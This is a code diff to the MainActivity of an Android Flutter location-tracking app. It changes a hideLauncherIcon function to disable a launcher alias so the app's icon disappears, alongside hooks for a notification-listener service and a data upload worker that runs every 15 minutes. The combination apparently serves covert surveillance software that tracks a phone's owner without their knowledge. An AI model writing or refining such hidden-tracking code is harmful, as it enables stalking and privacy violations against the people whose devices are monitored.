@@ -1,3 +1,4 @@
+// android/app/src/main/java/com/example/location_tracking_app/MainActivity.kt
 package com.example.location_tracking_app
 
 import android.content.ComponentName
@@ -17,7 +18,6 @@ class MainActivity : FlutterActivity() {
     private val BACKGROUND_CHANNEL = "com.example.location_tracking_app/background"
     private val NOTIFICATION_CHANNEL = "com.example.location_tracking_app/notifications"
 
-
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
 
@@ -31,7 +31,7 @@ class MainActivity : FlutterActivity() {
             }
         }
 
-        // Handler for starting/stopping the background worker
+        // Other method channels remain the same...
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, BACKGROUND_CHANNEL).setMethodCallHandler { call, result ->
             when (call.method) {
                 "startPeriodicDataUpload" -> {
@@ -47,8 +47,6 @@ class MainActivity : FlutterActivity() {
                 }
             }
         }
-
-        // Handler for notification permissions
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, NOTIFICATION_CHANNEL).setMethodCallHandler { call, result ->
             when (call.method) {
                 "checkNotificationPermission" -> {
@@ -64,6 +62,21 @@ class MainActivity : FlutterActivity() {
         }
     }
 
+    private fun hideLauncherIcon() {
+        val pm: PackageManager = packageManager
+        
+        // THIS IS THE KEY CHANGE: We are now disabling the alias, not the main activity.
+        // We must use the full package name for the alias component.
+        val componentName = ComponentName(this, "com.example.location_tracking_app.LauncherAlias")
+
+        pm.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
+    }
+
+    // All other functions remain exactly the same
     private fun isNotificationServiceEnabled(): Boolean {
         val cn = ComponentName(this, NotificationTrackerService::class.java)
         val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
@@ -73,7 +86,6 @@ class MainActivity : FlutterActivity() {
     private fun startPeriodicWorker() {
         val dataUploadWorkRequest = PeriodicWorkRequestBuilder<DataUploadWorker>(15, TimeUnit.MINUTES)
             .build()
-
         WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
             DataUploadWorker.WORK_NAME,
             ExistingPeriodicWorkPolicy.KEEP,
@@ -83,16 +95,5 @@ class MainActivity : FlutterActivity() {
 
     private fun stopPeriodicWorker() {
         WorkManager.getInstance(applicationContext).cancelUniqueWork(DataUploadWorker.WORK_NAME)
-    }
-
-    private fun hideLauncherIcon() {
-        val pm: PackageManager = packageManager
-        // This targets the default launcher activity. After this runs, the icon is hidden.
-        val componentName = ComponentName(this, MainActivity::class.java)
-        pm.setComponentEnabledSetting(
-            componentName,
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
     }
 }
